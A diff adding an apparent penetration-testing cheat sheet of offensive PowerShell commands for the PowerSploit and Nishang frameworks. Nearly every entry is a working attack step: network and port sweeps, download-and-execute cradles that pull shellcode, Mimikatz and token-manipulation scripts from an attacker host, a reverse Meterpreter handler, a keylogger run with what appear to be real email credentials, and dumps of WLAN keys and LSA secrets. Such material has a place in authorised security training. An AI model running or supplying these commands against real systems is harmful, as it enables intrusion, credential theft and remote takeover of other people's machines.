@@ -1,0 +1,117 @@
+Using Powersploit & Nishang
+
+COMMAND & 1 PARAMETER SYNTAX:
+
+     powershell -command "& {&'some-command' someParam}"
+
+MULTIPLE COMMAND & PARAMETER SYNTAX
+
+     powershell -command "& {&'some-command' someParam}"; "& {&'some-command' -SpecificArg someParam}"
+
+Tools to download:
+
+PowerSploit
+
+nishang
+
+afterwards copy nc.exe to the /var/www/ folder.
+
+
+Simple Ping Sweep
+
+    powershell -command "50..100 | % {\""192.168.200.$($_): $(Test-Connection -count 1 -comp 192.168.200.$($_) -quiet)\""}"
+
+Simple Port 445 Sweep
+
+    powershell -command "1..255 | % { echo ((new-object Net.Sockets.TcpClient).Connect(\""192.168.200.$_\"",445)) \""192.168.200.$_\""} 2>$null"
+
+Simple Port Scan
+
+    powershell -command "1..1024 | % { echo ((new-object Net.Sockets.TcpClient).Connect(\""192.168.200.XX\"",$_)) \""$_ is open\""} 2>$null"
+
+Download a file
+
+    powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.200.144/nc.exe', 'nc.exe')"
+
+Downloading files: Binaries
+
+    powershell -command "(New-ObjectSystem.Net.WebClient).DownloadFile("http://192.168.200.144/nc.exe","c:\nc.exe")"
+
+Text file stdout to local file
+
+    (New-Object System.Net.WebClient).DownloadString("http://192.168.200.144/PowerSploit/CodeExecution/Invoke-Shellcode.ps1") | Out-File -Encoding ASCII Invoke-Shellcode.ps1
+
+Powershell Download & Execute Reverse Meterpreter
+
+from ubuntu host browse to Metasploit folder
+
+    sudo ./msfconsole
+    use exploit/multi/handler
+    set ExitOnSession false
+    set payload windows/meterpreter/reverse_https
+    set LHOST 192.168.200.144
+    set LPORT 443
+    set EXITFUNC thread
+    exploit -j
+
+powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/infosecaddicts-Files/Powersploit/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.200.144 -Lport 443 -Force"
+
+Payload which could execute shellcode from DNS TXT queries.
+
+    powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.200.144/nishang/Execution/Execute-DNSTXT-Code.ps1','%TEMP%\Execute-DNSTXT-Code.ps1')
+    powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Execute-DNSTXT-Code.ps1 32.alteredsecurity.com 64.alteredsecurity.com ns8.zoneedit.com
+    powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.200.144/powersploit/Exfiltration/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz"
+
+Run mimikatz via PowerShell (must be run as SYSTEM)
+
+    powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/infosecaddicts-Files/Powersploit/Invoke-Mimikatz.ps1') | Out-File -Encoding ASCII Invoke-Mimikatz.ps1; Import-Module .\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz"
+
+Token Manipulation to escalate (must be run as an Administrator)
+
+    powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.200.144/powersploit/Exfiltration/Invoke-TokenManipulation.ps1') ; Invoke-TokenManipulation"
+    powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/infosecaddicts-Files/Powersploit/Invoke-TokenManipulation.ps1') | Out-File -Encoding ASCII Invoke-TokenManipulation.ps1; Import-Module .\Invoke-TokenManipulation.ps1 ; Invoke-TokenManipulation"
+
+Nihsang payload which Scan IP-Addresses, Ports and HostNames
+
+    powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.200.144/nishang/Invoke-PingSweep.ps1','%TEMP%\Invoke-PingSweep.ps1')
+    powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Invoke-PingSweep.ps1 -StartAddress 192.168.200.50 -EndAddress 192.168.200.100 -ResolveHost -ScanPort
+
+Nihsang payload which Scan IP-Addresses, Ports and HostNames
+
+    powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.200.144/nishang/Port-Scan.ps1','%TEMP%\Port-Scan.ps1')
+    powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Port-Scan.ps1 -StartAddress 192.168.200.50 -EndAddress 192.168.200.100 -ResolveHost -ScanPort
+
+Nishang Payload which gathers juicy information from the target
+
+    powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.200.144/nishang/Get-Information.ps1','%TEMP%\Get-Information.ps1')
+    powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Get-Information.ps1
+
+Nishang Payload which gathers juicy information from the target
+
+    powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.200.144/nishang/Information_Gather.ps1','%TEMP%\Information_Gather.ps1')
+    powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Information_Gather.ps1
+
+Nishang script which can drop and execute executables on multiple computers
+
+    powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.200.144/nishang/Run-EXEonRemote.ps1','%TEMP%\Run-EXEonRemote.ps1')
+    powershell.exe -ExecutionPolicy Bypass -command Invoke-Command -FilePath %TEMP%\Run-EXEonRemote.ps1 -ComputerName Test-PC
+
+Nishang Payload which logs keys
+
+    powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.200.144/nishang/Keylogger.ps1','%TEMP%\Keylogger.ps1')
+    powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Keylogger.ps1 16e7a8a83f04eec8ab6bc1bce9d103e3 juraghh@gmail.com ITp!Ka3099 1 http://example.com stopthis
+
+Nishang Payload which silently browses to a URL and accepts Java Applet Run Warning
+
+    powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.200.144/nishang/Browse_Accept_Applet.ps1','%TEMP%\Browse_Accept_Applet.ps1')
+    powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Browse_Accept_Applet.ps1 http://192.168.200.144:8080/JavaExploit
+
+Nishang Payload which dumps keys for WLAN profiles
+
+    powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.200.144/nishang/Get-WLAN-Keys.ps1','%TEMP%\Get-WLAN-Keys.ps1')
+    powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Get-WLAN-Keys.ps1
+
+Nishang payload which extracts LSA Secrets from local computer
+
+    powershell.exe (new-object System.Net.WebClient).DownloadFile('http://192.168.200.144/nishang/Get-LSASecret.ps1','%TEMP%\Get-LSASecret.ps1')
+    powershell.exe -ExecutionPolicy Bypass -command %TEMP%\Get-LSASecret.ps1 -filename .\servers.txt
